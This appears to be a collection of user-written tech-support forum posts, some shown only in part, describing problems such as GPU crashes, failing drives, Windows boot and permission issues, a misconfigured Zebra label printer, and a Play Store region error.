Not sure if this caused the issue but it's probably worth mentioning. \n\nSince around that time, I have to open most of my apps by right clicking and running as administrator, and associated files will not open the required app when double clicked (like for example an adobe acrobat document doesn't open adobe acrobat). \n\nWhen I DO open acrobat, it says it's running in protected mode. \n\nTrying to load Steam and many other things provides the same situation, I have to right click them and run as admin or they will not open. \n\nI've tried all the SFC/DISM commands, tried assigning admin, my account has full admin etc etc. At a loss as to how to fix this or what to do. When I reinstall programs, that seems to reset them and get them working again but there is also some issue with programs not being able to create required files in certain folders such as my documents, where I'll have to go in and allow a program permissions individually. \n\nIt's really strange, I've never encountered anything like this before.

Since then, I keep getting an incorrect country error, even though the VPN is now off.\n* To test this, I created a Singapore payment profile and used the same card. And the purchase went through. This confirms that Google play thinks I’m in Singapore. However, the prices were in SGD, which is more expensive. Also, in Google Play Store location settings, my location showed as Singapore.\n* I then switched back to my Sri Lanka payment profile, and my location in Google Play Store settings updated back to Sri Lanka.\n* However, internally, something still isn’t registering correctly, either my IP address is still flagged, or Google Play hasn’t fully reset my location and because of that my purchases still won’t go through.\n* I have also tried clearing storage and cache of play store and play services. But I haven't tried resetting my entire phone yet.\n\nI need to convince Play Store that I’m in Sri Lanka and not Singapore.\n\nIf anyone knows:\n\n1.

So, I did some research, and found out about harddrive enclosures, which, if I'm not mistaken, essentially have the ability to turn harddrives into external harddrives when they are placed inside of them.\n\nI edit gaming footage for youtube and have lots of clips, which take up lots of space, which is why I wanted an external harddrive to begin with. (But I got a harddrive rather than an external harddrive which is the reason for all this hassle). Point being, all that the hardrive would be used for is short video clips.\n\nNow, the problem I'm having, is knowing which one to buy. Also, all of them I can find on amazon have lots of bad reviews. The rules of this subreddit say no asking for recommendations, but I'm not really sure how else to approach this situation. I have no knowledge about this subject, and I'm pretty clueless when it comes to hardware in general. I also don't know anything about the process of getting one set up- I thought you just put the harddrive in and plug it into your computer, but it is looking like there may be more to it based on some reviews I have read.\n\nI want to order a harddrive enclosure as soon as possible, so please, if you are knowledgeable about the subject, let me know how to go about finding one that will work for me and my needs! Thanks very much. If you need anymore info about the harddrive, feel free to ask in the comments."

            "description": "Hi! I recently bought an USB-enclosure for an M.2 SSD that has been lying around for two years and was originally an internal drive from a previous laptop. Unfortunately, it doesn't work. It is a Kingston RBU-SNS8152S3/128GG2. The drive does not appear in Windows Explorer. When I open Disk Management, it asks me to initialize the drive before it can be accessed. When I try to initialize it, a new window opens that says \"Incorrect function\". It also does not have a drive letter assigned.\n\nThe hardware manager detects a device called \"Realtek RTL9210 USB Device\". This seems to be the enclosure. The drive is definitely connected to the enclosure. I have removed and inserted it several times.\n\nDoes anyone have any idea how to fix this or is it likely that the drive is lost? Thanks."

            "description": "I have a Seagate HDD (part number 3FPAPD-500, model number SRD0VN2) for my backups, and it often has these issues:\n\n1. Frequently takes about a minute to be recognised by any laptop (happens on multiple Windows 11 laptops I've used so I am certain that the issue is not in the laptop)\n2. Does not get ejected unless I click on the eject option in the taskbar twice (says the drive is in use the first time I click it)\n3. Sometimes makes a sound (as if it is slowing down the platters after I unplug the drive) while it is still plugged in and does this again and again every second, only stops if I disconnect and reconnect\n4. Included encryption software makes the drive run at well below 1 MB/s for writes, so I had to leave it unencrypted (I don't know whether this is supposed to happen so I am mentioning it just in case)\n\nToday I had a new issue, where the drive first wouldn't be recognised even after a few minutes (it had made the \"slowing down\" noise 2-3 times by then), so I unplugged it and plugged it back in. Windows then told me it found some errors, so I got those fixed, and then copied about 160GB of data to the HDD.\n\nAfter that, I was going through both my newest backup and the second-newest backup to delete duplicate files, when Windows suddenly blocked me from viewing some files, though I could go inside folders and see the names and sizes of those files, saying I had no permission even though I was the admin. It also blocked attempts by me to force it to change file ownership, giving a \"failed to enumerate objects in the container\" error, and then began to block even entering most of the other folders. Using the chkdsk command told me that the drive had become \"raw\". I didn't have another drive at the time for a second backup, but I disconnected and reconnected the drive, and it began to work properly. Crystaldiskinfo doesn't seem to find any signs of impending failure, but I am leaving the drive unplugged until I can get another drive to move everything to.\n\nNow, I will definitely be getting a second external HDD (probably a WD since I've never had issues with those), but I want to just confirm whether this new issue is actually a sign of failure or something that will go away with a reformat, and whether this particular Seagate drive model is known to have such problems. I do have warranty until the end of this year, but I just want to know in advance how bad this issue is before I start an RMA.\n\nEDIT: The disk partitioning window was showing the drive as NTFS at the time, I forgot to mention this."

Maybe because I opened it with the exe file? I'm not so sure on that but I hope you the reader are. \n\nI have also tried Recuva which is a free download that claims to be able to find deleted files, I have had it scan the folder where the game is located and also had it scan the Unreal Pak folder and neither scan has come up with the file I so desperately need back.\n\nI have also tried starting the game up but as expected it shoots me with an error message saying \"Failed to open descriptor file.....Stalker 2.uproject\" which isn't what the file I need was called but I'm guessing it all works some how.\n\n(Fyi the file I need is called \"pakchunk0-Windows.pak\") If that helps anyone. \n\nObviously indicating that this Pak file is crucial to game functionality, whether that be a save file im not sure but what I do know is that I need it back. 😭\n\nI really hope someone is able to help me recover this file as I would be devastated to have to restart weeks of progress."

            "description": "Hello to anyone who reads this. I desperately need help, this is my last resort.\n\nI purchased a Gigabyte Nvidia RTX 3080 a couple years ago, and ever since, I have been battered by the same crashing issues over and over again to no avail, no matter how many things I try to do to fix it. At first, it was working fine! Pretty soon, however, I began to have this crashing issue where either:\n\nA) my monitors would go black and indicate that they were no longer receiving any input, but the computer would continue to run, even allowing me to continue talking in Discord; the screens would not come back on unless I restarted the computer.\n\nB) the computer would freeze and become entirely unresponsive, meanwhile the audio would begin to stutter and lag, which could only be fixed by forcefully restarting the computer with the PSU switch. Sometimes, in this case, the computer would eventually come to a complete crash and reboot automatically, and sometimes it would just stay frozen forever until I restarted it myself.\n\nThe biggest problem with these crashes is that the majority of the time, they never fully crash the PC, which means NO errors related to crashes show up in the event viewer. When the computer DID crash fully, however, the crash logs always led to a service titled \"nvlddmkm\" or something. I had a tech savvy friend try and help me fix this over the course of WEEKS to no avail. I've been messing with this problem for so long, I don't even remember the specifics of all the solutions I've tried.   \n\nSome things I know I've tried: \n\n* Updating graphics drivers and Windows\n* Reinstalling Windows\n* Upgrading to Windows 11\n* Updating BIOS\n* All kinds of properties and permissions settings related to the \"nvlddmkm\" service\n* Upgrading the power supply\n* Turning down graphics settings in games that were frequently crashing\n* Probably some more stuff I've forgotten about\n* And finally, most recently, COMPLETELY replacing the entire computer with the exception of the 3080\n\nIn the meantime, I have been using my old RTX 2060 as a substitute, and it works fine! I just want an upgrade! The part that baffles me is that I have had the 3080 card RMA'd TWICE. The second time, I even had some dude messaging me back and forth assuring me that the card was preforming perfectly during their benchmarks, and asking if there were any additional tests that I could get them to perform.\n\nI've been meaning to upgrade some other components in my computer for a while now, and I got a good chunk of change for Christmas, so I decided to just take the leap and buy a whole new system with AMD framework instead of Intel. The problem persists, and its even more confusing, because it works fine on most games now, however both ***modded*** Minecraft AND ***modded*** Project Zomboid have started causing crashing issues. Now I'm questioning if its the RAM causing the problem or something, but I don't see how that would make any sense. \n\nI sold the pc with the 2060 to a friend, because it seemed like the 3080 was finally working in a new system, so now I don't have a backup! I REALLY don't wanna have to shell out another 500+ dollars for another GPU. If anyone has any ideas, I'm on my hands and knees here, I don't know what else to do besides just buying another card.\n\nIf anyone needs them, my new PC specs are as follows:\n\n* AMD Ryzen 7 7800x3d\n* Gigabyte GeForce RTX 3080 Gaming OC 10G\n* 64GB TEAMGROUP T-Force Vulcan DDR5 6400mHz \n* MSI MAG X670E TOMAHAWK WIFI motherboard\n* Corsair 850w PSU (I don't remember the exact name)\n\nP.S.) When I built this new PC, I ended up struggling with the RAM. When I would turn the PC on, a red light would show up on my motherboard next to the \"CPU\" indicator. I eventually traced this to the RAM, and got it to work, but I was getting a DIFFERENT game crash on the same games, where it would say I had \"insufficient memory\" or something. I had 32gb slotted at the time, which should've been MORE than enough, and I couldn't figure it out. I ended up buying 2 more sticks of the same RAM, so now I have 64gb, and that fixed the \"insufficient memory\" crashes and errors, but now I'm having ***this*** problem. I'm so tired. I think I'm gonna have PTSD for computer crashes after this. \n\nSorry for the essay, but this has literally been happening for YEARS at this point, so its a complicated issue.\n\nThank you in advance for any help.

So I turned off 2FA on my account and deleted both of the GA codes from the GA app.\n\nI went back into my account and turned 2FA on again expecting it to take me through the same process of scanning the QR code again. It doesn't do this. It just turns on 2FA and that's it. This is a problem because I don't have the codes in my GA app anymore. Luckily I could just turn off 2FA with no issue. As long as I don't log off the account while 2FA is on then I'm good. I still have full access to the account with normal password login.\n\nHow do I start the 2FA process over from scratch so that it lets me scan the QR code again? Or how do I recover the 2FA codes I deleted from the GA app? Are either of those possible?"

            "description": "**Windows 10**\n\nI recently built a new PC, and I moved my disks over to the new machine. It wasn't until this happened that I realized my existing Windows install had placed itself on two disks, the boot partition on my crucial SSD, and the system files on my other Sandisk SSD. I had heard about Windows doing this but didn't realize it had happened to me also. This is really an awful practice; my system cannot start without BOTH disks inserted and functioning. What makes this worse is that I had been using the crucial SSD for my Linux install. I was dual booting (on different disks) yet I wasn't even aware Windows had sneakily installed itself on the Linux disk. I was very close to reformatting the Linux disk.\n\nAn additional, possibly related issue is that I get the following error whenever I boot: \n\n&gt; Windows failed to start. A recent hardware or software change might be the cause. To fix the problem:\n&gt; ...\n&gt; a repaired device isn't connected or can't be accessed (0xc000000e). \n\nI have been able to get around this issue by using boot override. But it's really inconvenient having to do this. I'm guessing the error has something to do with the fact that I'm running on new hardware. But this error isn't my primary reason for making this post: I don't care so much about resolving this issue, rather, I want to move my installation from my Sandisk SSD to my Crucial SSD. Whether this is related to the error or not is less my concern. **I am able to access Windows and login normally**.\n\nI have attempted several times to move my installation but failed, I can't remember the steps I took nor what prevented me from doing it. **I don't know whether the fact that my boot partition is on the same disk that I intend to use as my main disk affects how I achieve this**. While there are many articles online that tell you how to do this, I don't know if this is a complication.\n\nFor context, I use this machine for gaming only. There aren't really any important files on either of the disks I've mentioned. But I would rather not have to reinstall Windows again, it would take quite a bit of time that I would rather save.\n\nMy Sandisk SSD is 240GB while my crucial disk is 1TB. If I reformat the crucial disk, it will erase my boot partition, rendering my installation unusable. What do I do?"

            "description": "This is a bit of a sequel to the last post I made in this subreddit, where I needed help getting my Steam Deck to work with Windows again after I edited some partitions. (https://www.reddit.com/r/techsupport/comments/1hdyhuu/attempted\\_to\\_delete\\_steamos\\_partition\\_with/)\n\nSince then, my Steam Deck has been working completely fine, except for one thing: it only correctly boots into Windows 11 on restart, or after the second try. What I mean is, when I press the power button on my Deck to turn it on, it initially only loads into a black screen, and never actually boots into Windows 11. It doesn't make any sounds, it doesn't display anything on screen, it just stays at a black screen until I hold down the power button to restart the system (the power button always restarts the Steam Deck when it's running windows rather than turning it off, for whatever reason). However, once I use the power button to restart it, the Deck immediately boots into Windows 11 straight away, and there are no problems at all. It's not exactly a major issue, or much of an issue at all to be perfectly honest, but it is kind of annoying, and I'd like to be able to solve it, assuming I can do so without another system wipe or any major hassle like that.\n\nI have a theory about what's causing this, but it's a bit of a stretch: Technically speaking, I believe my previous (and now extremely broken) installation of Windows 11 is still present on my SSD, despite having done multiple wipes on it before reinstalling. This is evidenced both by the fact that there is a small amount of data on my SSD that doesn't belong to anything in my current Windows installation, and also the fact that the broken installation of Windows 11 still showed up as a boot option when I was installing Windows 10, and I think it still shows up on the BIOS. It's probably also worth pointing out that this current problem only manifested itself after I upgraded the Windows 10 installation into Windows 11. I think the general problem may be that the Steam Deck is trying to choose between the two different installs of Windows 11 when I first turn it on, and only after restarting is it able to find the correct one. \n\nAssuming that's the problem (please correct me if it isn't, I'd rather be corrected on something that fuck up my computer, again), how would I go about fixing it? Is there a way to make the Steam Deck boot into a specific OS on startup, and ignore any others? How would I apply those settings if so?\n\nAny help would be appreciated here."

Me and a few coworkers work as trail crew/ field biologists and ecologists for NPS in Washington. Our tech person gave us an inseego fx 2000 to give us hot spot wifi, but it’s old and feels it just drops super consistently when ever wind/ rain / snow storms happen.

Black screen with fans spinning at top speed for about 20-30s\n2. Fans normalize and I see the logo of my motherboard, beginning booting process. Takes about 10s\n3. I'm in windows login screen.\n\n  \nAccording to my friend, this is a completely normal process, but it keeps bothering me, because my old PC didn't have this 30s black screen dead time, and it doesn't make sense that this new hardware which should be around 50% power upgrade from the old one (considering RAM freq, processor, etc) takes longer than my old PC to boot. Also, I'm using a M2 for boot.\n\nI have other issues that I don't know if they are related, but just in the case it may be symptoms of an issue, I'll mention them:\n\n* Randomly, windows explorer freezes for 2-3 minutes, happens like once per boot.\n* Sometimes, windows bar takes less priority and would hide behind applications as if it wasn't there. Restarting my PC fixes it.\n* Randomly, my PC shuts down, but the hardware stays on, with the fans going full speed. Exactly in the same manner that my PC stays each time I turn it on. In this state, power button and restart button are completely useless, and the only way I can restart it is by shutting down the PSU and turning back on again. Checking the logs, it attributes to some issue with logitech light control, but I even followed the workarounds of disabling the services and still occurs. This doesn't happen very often, would say once every 2-3 weeks.\n\nI started normalizing this, as over time has become mildly annoying, but wanted to know if someone has more insight on what it can be.\n\n  \nSPECS:\n\nMB ROG STRIX X870E-E GAMING WIFI\n\nPSU 1000W Gold 80 Corsair RM 1000x\n\nRAM: 32GB DDR5 7200Mhz\n\nCPU: AMD RYZEN 9 7900X3D\n\n"

A true workhorse who's definitely to gotten a lot of wear and tear over the years. About 2 months ago I noticed the keyboard wasn't working correctly. After some troubleshooting , I deduced that if I leaned too much with my wrist on the area by the trackpad it was causing some of the keys to stick or jump or not work. Unfortunately I had to go in for surgery shortly after that discovery and I'm only now recovering and back to work this week, so I've not yet gotten a chance to bring her in to be looked at.\n\nLast night, suddenly I started getting these jumping lines across my display that take on the colors of whatever was on desktop at the time. My two external monitors work just fine on extended display. It also still does it when not connecting to anything whatsoever. I noticed I can kind of jiggle the screen portion of the laptop it will get rid of the lines but any jostling causes them to return intermittently. It is inconsistent and also sometimes happens when I'm not touching it at all. \n\nI did a bunch of googling and it seems like perhaps the connection between the screen and body might have a problem. Another post said it could be a damaged LCD screen- however my laptop has literally not moved in over 6 weeks, in fact it wasn't even on for almost 3 weeks (but I have been using it for about a week now )\n\nMy questions are -\n\nCould the keyboard and screen issue be related?\n\nThe laptop was nearly 2K when I bought it 5 years ago, and I don't mind putting money in to get it repaired (unfortunately the warranty expired and Lenovo had no options for coverage for a computer of this age ) but is it going to be worth it? I am curious if these existing issues could be indicative of other problems and it's just going to be downhill from here and not worth investing in the repairs? \n\nAny suggestions for next steps?\n\nThanks so much! \n\n\n\n\n"

I tried the HDMI cord on another device; it works with the TV. \n\nIt's just really strange, I am not sure what to do further here. \n\nThe only thing that I have done today was update my drivers for my RTX3070, I swear my TV display was working earlier in the day but I honestly can't be sure. \n\nAny help would be really appreciated. \n\nIt is a Samsung TV and a PC on Windows 11.

            "description": "Hello everyone. I've been getting really frustrated with my laptop. Issues started a few weeks ago when my laptop would suddenly crash after booting up. After a few restarts it would be stable. This persisted for a week then I stopped using my laptop as I didn't need it. Recently however, I just tried booting up into my laptop and the same issues occured again, only this time, a lot more serious. I tried restarting a couple of times but it would either randomnly turn off during boot up, boot into recovery options or, if I get lucky enough to get past the loading screen, get blue screened with the error code CRITICAL_PROCESS_DIED. \n\nAfter a few more restarts, I started researching. I tried using sfc /scannow in cmd in the recovery menu which seemed to have fixed the problem but then the issues started again. I booted into lenovo's own diagnostic tools and did a quick test for all of the hardware of my computer. None of them had issues. Then I decided to do a fresh install of windows 11 as I had nothing on my laptop worth saving. Before this, I also tried window's own startup diagnostics and it found nothing. I make the bootable windows installer on my USB and plug it into my laptop. It boots into it but then it turns out my SSD isn't getting detected. I checked the BIOS and booted into it and it turns out it can't detect my SSD anymore.\n\nNow, when I was trying to solve these issues earlier, my SSD was getting detected just fine. But now whenever I try to use the recovery key for it, it can't get unlocked apparently. I'm at a loss. It's either my SSD got corrupted so badly from all the restarts that it decided to end itself or my computer is utterly fucked.\n\nDo I take it to a repair shop to get a new drive installed or is it savable?\n\nIt's a Lenovo ideapad 3.\n\nEdit: so I got past the loading screen and I had enough time to check if the disk worked at all. I managed to read from it and delete a file which means the disk itself is probably fine. So it's definitely a major software fault"

Last week it froze completely, I'm talking not even holding the power button would shut it down. I had to switch off the power on my PSU just to shut it down. After that it would turn on, in the sense of all my components lighting up and fans turning on, but I only had a black screen and the DRAM light was constantly on. I've tried all the suggested troubleshooting that seems to work for everyone else but nothing has helped me so far.  \n  \nI've done the following:\n\n* Cleared CMOS via both battery and shorting\n* Reseated RAM\n* Tried different RAM sticks\n* Waited up to half an hour just to see if it was memory training\n* Tried 1 RAM stick, in different slots \n* Reseated GPU\n* Flashed latest BIOS, then cleared CMOS\n* Plugged into different monitor\n* Plugged monitor directly into motherboard, both with and without GPU installed\n\nAt this point I bought a completely new motherboard. Plugged it in... DRAM light and black screen, and bounced back and forth to CPU light as well. Cleared CMOS again, flashed BIOS... Still nothing... So then last resort I bought a new CPU. STILL NOTHING. Still getting DRAM Light, although now the computer will turn on and off again in a loop (whereas before it was staying steadily on, just nothing showing). Cleard CMOS, flashed BIOS, waited for potential memory training... Nothing.\n\nThis has driven me crazy. It's my first build too... What luck.

Recently I have noticed that no matter what I do, there are some applications on my taskbar that refuse to open by clicking on them. I have to search for them in the start menu, right click and click run as administrator, The two i noticed this with is Zoom and Steam. However, once steam is open, I can then click on it from the action menu in the bottom right of taskbar and get it come up fine. I have used a uninstall tool to completely delete them and any trace of them on my pc, then reinstalled them, and it does not change. Interestingly also, zoom just would not let me uninstall it with control panel, so I had to get the uninstall software (REVO uninstaller). I ran Malware bytes and windows defender stuff, and I am just unsure what to try next, like it is not the end of the world, but it is weird to me that it is recent and seemingly out of nowhere.

After a few months, the problem came back, and I haven't been able to establish a route cause. Sometimes I will go for months without experiencing an issue, and other times, I'll have multiple crashes within minutes. I have been experiencing this problem for 3 years now.\n\nThe sort of crash that I experience causes all of my display outputs to turn off, but the computer remains on. Windows seems to operate somewhat normally for a few seconds (of course I can't see anything, though) before I lose audio. The only way to fix the issue is by hard shutting down and rebooting. \n\nI am not having thermal issues, and the crash does not seem to be correlated to heavy workloads. The only thing that seems to make the issue go away for a while is removing and reinstalling the graphics card.\n\nI have re-applied thermal paste to the GPU multiple times and added thermal pads to the VRMs and the backplate of the graphics card.

I currently use Raccoon Resize for my triple screens and get about 60-110 FPS in game, the frame fluctuation is the main issue I have since fps drops quite much mid racing. I have a RTX 3080 and ryzen 7 5700X.\n\n1. Would the lossless scaling [https://store.steampowered.com/app/993090/Lossless\\_Scaling/](https://store.steampowered.com/app/993090/Lossless_Scaling/) have any use for me FPS wise, would it look like 120fps while actually im at 60-110 fps ? What benefits would I have fps wise overall.\n\n2. Should I limit my fps in Nvidia settings to my lowest fps so that I don't get those fps drop spikes during racing, for example limit my fps to 60 ?\n\n3. Can the Lossless scaling add gpu heat or extra load. I read in previous topics that people were concern if it could actually damage the gpu ? (is this true at all) ?"

I competitively playing counter strike and about a week and a half ago  during one of my games I started to get weird freezes which occurred every 10 to 30 seconds and lasted around 1 second. I just restarted my pc and the issue was gone until last Sunday. The issue reappeared again during counterstrike game after the game I check my event viewer and I noticed reoccurring error message 'Reset to device \\device\\raidport0 was issued.' which occurred around 10 to 30 second intervals, had a suspicion that this was an issue. After some googling and friend advises I updated my ssd drivers, checked ssd health and updated my drivers (also performed an sfc scannow) there was no issues until today. Again during the counterstrike game I got these same freezes. So I came here to ask for advise or solution to my problem if anyone had similar problem. \nMy pc specs :\nCPU: AMD Ryzen 7 9700X\nGPU: NVDIA GeForce RTX 4070 Ti SUPER\nRAM: 2x Kingston KF560C30-16 DDR5\nSSD: Samsung 990 EVO Plus 2TB\nMotherboard: MAG B650 TOMAHAWK WIFI\nPower supply : 850 W gold standart (forgot the manufacturer) \nCPU cooler : Noctua DH-15 g2\nAll parts are brand new. \n\nDuring the time I have this pc I played at least 10 different games and the problem only occurred during counterstrike games when using faceit anti-cheat (kernel access anti-cheat) I have no idea if it is related to my problem. Also it doesn't happen every game. I hope you guys give me some advice. "

            "description": "I just picked up a secondhand Zebra LP-2844-Z thermal printer. It's the version with USB, Ethernet, and serial ports in the back, and it works as it should when I plug it into my laptop's USB port. (I'm running Windows 10.)\n\nWhen I plug the printer into the unmanaged gigabit switch that's connected to my router, the status light in the back starts blinking red then eventually goes steady green. (The switch and cables in question are known good. I use them all the time.) No matter what, the printer won't show up in the list of connected devices in my router's web interface. The Add Printer wizard won't automatically find it on the network, and errors when I try to manually enter the IP I get from the printer's config page. It also errors when I try to install it manually by IP through Zebra Setup Utilities.\n\nI'm not that much of a network guy but I have an old HP laser printer connected to the same LAN via Ethernet, no issues.\n\nAs far as I can tell, the issue is that I can't change the printer's default gateway or IP address. It's permanently set to gateway 10.180.137.1 and IP 10.180.137.237. My router's gateway is 192.168.34.1. I've tried to give the printer this gateway address and a new static IP in the 192.168.34.X range using both Zebra Setup Utilities and ZebraNet Bridge Enterprise apps. This lets me see the ZPL commands it's queued, as it displays them before asking me to hit Finish and send them over. The code in question looks like:\n\n    ^XA\n    ^NSP,192.168.31.101,255.255.255.0,192.168.31.1\n    ^NBC\n    ^NC1\n    ^NPP\n    ^XZ\n    ^XA\n    ^JUS\n    ^XZ\n\nAfter sending these commands to the printer, nothing changes. When I use the little black button next to the Ethernet port to make it print a print server configuration page, it's still showing IP 10.180.137.237 and gateway 10.180.137.1. This page shows the error \"Could not Bind IP Address to Eth\".\n\nI've factory reset it a bunch of times, variously using the front button (held down until the status light blinks green four times, then releasing), the Zebra Setup Utilities app, and the ZebraNet Bridge Enterprise app. This will make it forget some basic stuff like darkness and label size, but the TCP/IP settings stay constant. I've also updated the printer to the latest firmware, V45.11.7ZA.\n\nIf I visit [10.180.137.237](http://10.180.137.237) in my browser, all I get is a timeout error.\n\nA pic of my general config and print server config pages [here](https://imgur.com/a/c7uOX9C).\n\nSomebody had this exact problem ten years ago. ([https://www.reddit.com/r/Ebay/comments/32vu0y/cant\\_get\\_my\\_zebra\\_lp\\_2488z\\_to\\_reset\\_or\\_change\\_its/](https://www.reddit.com/r/Ebay/comments/32vu0y/cant_get_my_zebra_lp_2488z_to_reset_or_change_its/)) They managed to access the Zebra's web interface by plugging it into their computer's Ethernet port and setting their network adapter to a compatible IP range. I don't think I know how to do the second part of that properly. I've gone into Control Panel &gt; Network and Sharing Center &gt; Ethernet Properties &gt; Internet Protocol Version 4 Properties and manually set my laptop to use IP address 10.180.137.1, subnet mask 255.255.255.0, default gateway 10.180.37.1. But then I couldn't ping 10.180.137.237, and visiting the address in a browser gave me the same timeout error.\n\nSomebody hold my dumb hand through this a little? I've wasted so many labels printing blank and config pages."

So if they really are pigtailed, should I just plug in one connector including the pigtail? Or should I plug in both pcie connectors into the gpu and have two pigtails just hanging there... I dont really care about aesthetics and my case is VERY tinted, so thats no concern, but are there any issues in having two different cables plugged into the gpu, and those both have pigtails extending off? Im just a bit concerned here and questioning what I should do. "

Computer had been acting weird lately with random crashes but didn't get a blue screen until then. Rebooted I opened discord and it wouldnt let me click anything then it closed without warning and wouldnt open back up along with everything else other then microsoft settings. Restarted computer and then I kept getting constant BSOD with different codes. Eventually the computer got stuck in a boot loop so I tried windows recovery and nothing would work. Said fuck it and had my brother install windows 11 on a USB and I did a fresh install from boot manager. When I got back into windows I kept getting random BSOD up until I did a driver rollback on my 4090. If anyone else has this issue download Version 566.36 released on Dec 5th 2024 from Nvidia's website and install through the .exe if you just rollback it doesnt allow you to use DLSS or Transformer in Cyberpunk.

I have a laptop with a MUX switch and was counting on this feature to extend battery life during light tasks.\n\nHere’s a video showing how the issue looks. It's from about a year ago on a slightly different Lenovo LOQ model I had before, but the problem persists on my new model as well (I foolishly thought it was only present on my older model).  \n[**https://www.youtube.com/watch?v=6o4zQfY7W6c**](https://www.youtube.com/watch?v=6o4zQfY7W6c)\n\n# Specs:\n\n* **CPU:** Intel Core i5-13500H (Raptor Lake)\n* **Display:** 15.6\" IPS,  G-Sync, 2560 × 1440, 165Hz\n* **RAM:** 16GB DDR5\n* **GPU:** NVIDIA GeForce RTX 4060 8GB (115W, MUX switch)\n* **Storage:** 1TB SSD\n\n# Issue:\n\nThe problem occurs when switching from dGPU to iGPU after gaming. Every time I launch a game, the system correctly switches to the dGPU, and everything runs perfectly. However, once I exit the game, the system switches back to the iGPU, and then my screen starts **freezing in 5-10 second intervals for about 2-3 seconds at a time**. This issue persists until I restart the laptop. After a reboot, everything works fine on iGPU—until I start another game.\n\nThis happens in all power modes (**Silent, Balanced, Performance**) and whether the laptop is plugged in or running on battery.\n\n# Troubleshooting I've Tried (Without Success):\n\n✔ Used **DDU** to completely uninstall both iGPU and dGPU drivers, then installed the latest ones  \n✔ Updated **BIOS** to the latest version  \n✔ Disabled various **power-saving settings**  \n✔ Tested different **GPU modes** (MUX switch enabled/disabled, hybrid mode, dGPU-only mode)\n\nThe only way to avoid the issue is to run on **dGPU-only mode**, but that significantly reduces battery life by about 2 hours.\n\nHas anyone else experienced this? Any solutions that worked for you? I'd really appreciate any advice.\n\n**Thanks in advance!**"

The software works but has a 30 day countdown until it stops working. I talked to Sage support, they say its a network problem on our end. This problem started after a Sage update, previous to this Sage had been working for years.\n\nThe solution to make it work is to enable IPv6, so it seems to be a DNS issue.\n\nThis network has about 25 computers on a domain. All the computers DNS is set to the domain controller and IPv6 is turned off on the computers.\n\nCurrently on the DC the forwarders are set to google [8.8.8.8](http://8.8.8.8) and 8.8.4.4. I have tried using Cloudflare and a few other DNS servers as forwarders but it did not change the behavior.\n\nWhen I have IPv6 turned on a computer it gets Cloudflare and Google for IPv6 DNS. This makes the Sage error go away (it  can reach the licensing online) but breaks the connection to the domain as the DC is no longer the DNS.\n\nI tried adding Google DNS (8.8.8.8) and Cloudflare (1.1.1.1) to a computers DNS, it did not make Sage work. Only using IPv6 has made Sage work but as mentioned that breaks communication to the DC.\n\nThe IPv6 DNS is coming from the router and cannot be turned off or changed, it is a stupid ISP modem/router combo. I have the login but that feature cannot be changed without a Static IP for WAN which this network doesn't have.\n\nHas anyone seen something like this before?"

I chose it because I needed something that could stay on 24/7 and be managed from another computer. I use the web interface of the IPMI (ASMB11-ikvm) to do so.\n\nWhen I start my computer, everything is ok. The IPMI works well and all. However, after a random amount of time (usually a couple of days on), the ipmi starts to glitch like :\n\n* When going to the login page ([https://192.168.xx.xx](https://192.168.xx.xx)), I'm immediatly \"falsely logged in\" as I see the interface like normal, with a grey overlay and the loading dots in the center. After a couple of minutes, I'm then loged out on the normal login menu. It is not possible to login again as the connection to page times out.\n* I'm unable to reach the login page and the connection times out.\n* I'm able to login, but the page is just white and then the connection times out\n\nMy ipmi is assigned a static ip outside the bounds of my router's DHCP.\n\nWhile the IPMI glitch, the server continues to run perfectly:\n\n* My plex server is accessible\n* I'm able to transfer files to my server with FileZilla\n* I'm able to ssh in my server\n\nWeirdly enough i'm able to successfully ping my IPMI with cmd even though the web interface stays unreachable.\n\nMy BIOS and firmware are the latest version available.\n\nThe only thing that works atm is to stop the server (with ssh), then turn the power supply off for 10 sec. I plug in a monitor and keyboard and boot to the BIOS. This reset the BMC settings to default. I then have to configure again a static IP (bc default is [10.10.10.10](http://10.10.10.10) and there are no default gateway specified). Finally I save everything and reboot. Good as new... till the glitch comes back a couple of days later.\n\nNow I know my share of google-fu but I'm no dev or sysadmin. Also there is not much documentation online about the IPMI. Is there someone that experienced something similar? Any ideas?\n\nThanks!"

Since then, I've been hearing an annoying buzzing sound only in Minecraft, almost like the interference you get from using the phone near speakers. The noise varies when I move the view around and only happens when I'm in a world or a server, not in the menus. When building the PC, I noticed that I had to push hard on the GPU for it to slot in, almost like if the slot at the back of the case was slightly too tall. The IO shield also was hard to click in, so maybe the motherboard isn't level with the back of the case. I'm not sure but maybe one of those things is the reason for the issue. I could have made a different mistake without noticing though. Since I didn't do anything apart from rebuilding the PC, I believe it's a hardware problem. How can I fix this buzzing noise? Thanks"

            "description": "I've read about a hundred reddit threads on this issue in the last week or so and I'm about at the end of my ability to find answers. I just had a new PC built using the GPU from my last build. Everything worked fine for about a month and then my games started crashing, with an error message stating my graphics driver timed out.\n\nI have tried everything I've come across online: multiple uninstall/re-installs of drivers, turning off multi-plane overlay, editing registry files to lengthen the amount of time before the drivers are considered 'timed-out', using DDU in safe mode to uninstall/re-install drivers, taking out the graphics card and cleaning dust/connections(no, I didn't think this would solve it but hey, might as well try), and a complete reinstall of windows. Nothing has come even close to working. Every time I launch a game, it runs half-stable for a couple minutes-depending on how demanding the game is-and crashes the same as before. I can't even run games that should be easy to run.\n\nMy concern at this point, having tried everything the internet has suggested, is that my old graphics card might be on the verge of dying. Problem is, I have no idea how to tell. Everything looked fine when I had the fan casing taken off of it, nothing obviously burned or broken, but beyond that I might as well be looking at a spaceship. Not sure what all info anyone would need to try to help but I'm currently using a Radeon RX 580 with a Ryzen 5 7600. If anyone needs further info to help, I will be more than happy to provide.\n\nTL;DR: Old RX 580 in new build is now crashing constantly. All suggested solutions have not helped, games still crash with graphics driver timeout error."

It doesn't sound like a lot, but this isn't a bad sector thing, where every NAND has some bad sectors from manufacturing and it's just locked out. No, this is like writing stuff down on a piece of paper, and 0.13% of it just disappears or randomly changes.\n\nAnd again, doesn't sound bad for human standards. And for human language, it ain't bad. But binary doesn't work that way. Computers doesn't understand context like a human would.\n\nError correction exists, of course. And this is I want to know. Is this kind of stats something a modern computer's error correction can handle?\n\nWhat's interesting is that the corrupted, missing, or bit flipped sectors basically tick up every second when H2testw was reading the crap it wrote.

The thing is that I haven't inputted my name on my account. And my phone number is showing on my profile after logging in as one that they inputted (starting in \"153\"). \n\nMy question is, how would I know if I've been sim swapped? There seems to be so many stories of people having been sim swapped and had no idea. \n\nHow easy would it be for someone to socially engineer their way to sim swapping my phone number and is there any way I would even find out this occured?"

